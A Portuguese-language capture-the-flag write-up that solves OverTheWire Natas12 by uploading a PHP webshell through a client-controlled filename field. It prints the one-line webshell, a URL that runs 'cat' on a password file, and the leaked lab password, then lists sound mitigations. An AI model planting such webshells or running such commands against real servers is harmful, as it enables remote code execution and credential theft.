# Writeup — OverTheWire Natas12

**Desafio:** Natas12  
**Categoria:** Web Security / File Upload  
**Objetivo:** Fazer upload de um webshell PHP para executar comandos no servidor e ler a senha do natas13

---

## Descrição do Desafio

O natas12 apresenta um formulário de upload de imagens JPEG. Apesar de aparentemente aceitar apenas imagens, o código possui uma falha que permite ao atacante **controlar a extensão do arquivo salvo no servidor**, possibilitando o upload de um script PHP malicioso.

---

## Análise da Vulnerabilidade

O formulário HTML possui um campo oculto que define o nome do arquivo salvo:

```html
<input type="hidden" name="filename" value="abc123.jpg">
```

O servidor confia nesse valor enviado pelo cliente para nomear o arquivo, **sem validar a extensão no backend**. Isso permite que um atacante altere o campo diretamente no navegador antes de enviar o formulário.

---

## Exploit — Passo a Passo

### Passo 1 — Criar o Webshell

Criei um arquivo chamado `shell.php` com o seguinte conteúdo:

```php
<?php system($_GET['cmd']); ?>
```

Esse arquivo recebe um comando via parâmetro `cmd` na URL e o executa diretamente no servidor.

---

### Passo 2 — Inspecionar o Formulário

Abri o natas12 no navegador e cliquei com botão direito no formulário → **Inspecionar Elemento**.

Localizei o campo oculto com a extensão `.jpg`:

```html
<input type="hidden" name="filename" value="n99oiowbch..jpg">
```

---

### Passo 3 — Trocar a Extensão

Diretamente no DevTools, editei o valor do campo oculto:

```
n99oiowbch..jpg  →  n99oiowbch..php
```

---

### Passo 4 — Fazer o Upload do Shell

Com a extensão já alterada, selecionei o arquivo `shell.php` e cliquei em **Upload**.

O servidor retornou o link do arquivo enviado:

```
The file has been uploaded to: /upload/551o0l6bfm.php
```

---

### Passo 5 — Executar o Comando

Acessei a URL do arquivo com o parâmetro `cmd` para ler a senha do natas13:

```
http://natas12.natas.labs.overthewire.org/upload/551o0l6bfm.php?cmd=cat /etc/natas_webpass/natas13
```

**Senha obtida:**
```
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

---

## Conceitos Explorados

| Conceito | Descrição |
|---|---|
| Unrestricted File Upload | O servidor não valida a extensão real do arquivo enviado |
| Client-side trust | A extensão do arquivo é definida por um campo oculto controlável pelo cliente |
| Remote Code Execution (RCE) | O webshell permite executar comandos arbitrários no servidor |
| Webshell | Script PHP mínimo que executa comandos via parâmetro GET |

---

## Conclusão

A vulnerabilidade do natas12 é um caso clássico de **Unrestricted File Upload** combinado com **confiança em dados do cliente**. O servidor usa o nome de arquivo enviado pelo formulário sem sanitizar a extensão, permitindo que um arquivo `.php` seja salvo e executado.

**Mitigações corretas:**
- Validar e forçar a extensão do arquivo **no backend**, ignorando o valor enviado pelo cliente
- Armazenar uploads fora do webroot, impedindo execução direta
- Verificar o **MIME type real** do arquivo, não o declarado
- Nunca executar arquivos enviados por usuários
